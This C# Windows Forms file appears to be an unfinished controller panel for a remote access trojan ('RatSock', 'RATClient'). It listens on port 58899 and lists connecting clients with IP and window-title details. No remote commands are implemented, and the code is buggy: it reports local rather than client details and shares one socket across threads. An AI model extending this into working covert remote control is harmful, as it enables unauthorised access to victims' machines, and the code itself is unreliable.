using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Runtime.InteropServices;
namespace WindowsFormsApplication2
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        TcpListener TCPListen;
        Thread PortListen;
        
       // NetworkStream NS;
       // StreamWriter SW;
       // StreamReader SR;
        Socket RatSock = new Socket(SocketType.Stream, ProtocolType.Tcp);
        bool Shutdown = false;
        
        List<int> ItemIndexList = new List<int>();
        int ItemIndex = -1;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Application.ThreadException += new ThreadExceptionEventHandler(Derped);
            PortListen = new Thread(Listen);
            PortListen.Start();
            richTextBox1.Text = Text + "\n Listening on port 58899";

        }

         void Listen()
        {
            
            for (; ; )
            {
                try
                {
                    TCPListen = new TcpListener(System.Net.IPAddress.Any, 58899);
                    TCPListen.Start();
                    RatSock = TCPListen.AcceptSocket();
                    IPEndPoint TCPEndPoint = (IPEndPoint)RatSock.RemoteEndPoint;
                    richTextBox1.Text = richTextBox1.Text + "\n Connection from " + IPAddress.Parse(TCPEndPoint.Address.ToString());
                    ListViewItem Item = new ListViewItem(Environment.UserName, ItemIndex);
                    ItemIndexList.Add(ItemIndex);
                    listView1.Items.Add(Item);
                    Item.SubItems.Add(TCPEndPoint.Address.ToString());
                    Item.SubItems.Add(Environment.OSVersion.ToString());
                    Item.SubItems.Add("Yes");
                    Item.SubItems.Add(GetActiveWindowTitle());
                    Thread RATClient = new Thread(() => Client(Item));
                    RATClient.Start();
                    ItemIndex++;
                }

                catch { }

              }

        }

         void Client(ListViewItem Item)
         {
             NetworkStream NS = new NetworkStream(RatSock);
             StreamWriter SW = new StreamWriter(NS);
             StreamReader SR = new StreamReader(NS);
             StringBuilder Input = new StringBuilder();
             for (; ; )
             {
                // MessageBox.Show(Item.ToString());
                 
                 try
                 {
                     SR.ReadLine();
                 }
                 
                 catch
                 {
                     try
                     {
                         Random Rand = new Random();
                         int RandSleep = Rand.Next(1000);
                         Thread.Sleep(RandSleep);
                         NS.Close();
                         SW.Close();
                         SR.Close();
                         Input.Clear();
                         listView1.Items.Remove(Item);
                         richTextBox1.Text = richTextBox1.Text + "\n Client has disconnected";
                         break;
                     }
                     catch {  }
                  }
             }
         }

         private string GetActiveWindowTitle()
         {
             const int nChars = 256;
             IntPtr handle = IntPtr.Zero;
             StringBuilder Buff = new StringBuilder(nChars);
             handle = GetForegroundWindow();

             if (GetWindowText(handle, Buff, nChars) > 0)
             {
                 return Buff.ToString();
             }
             return null;
         }

         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
             try
             {
             //RatSock.Close();
             //TCPListen.Stop();
             } 
             
             catch{}
             Environment.Exit(0);
         }

         private void button1_Click(object sender, EventArgs e)
         {
             //test = true;
         }

         private void listView1_SelectedIndexChanged(object sender, EventArgs e)
         {
             try
             { }
             catch { }
         }

         private void listView1_MouseClick(object sender, MouseEventArgs e)
         {
             try
             { }
             catch { }
         }

         private void Derped(object Obj, ThreadExceptionEventArgs Arg)
         {
             listView1.Items.Clear();
             RatSock.Blocking = true;
         }

      }
}

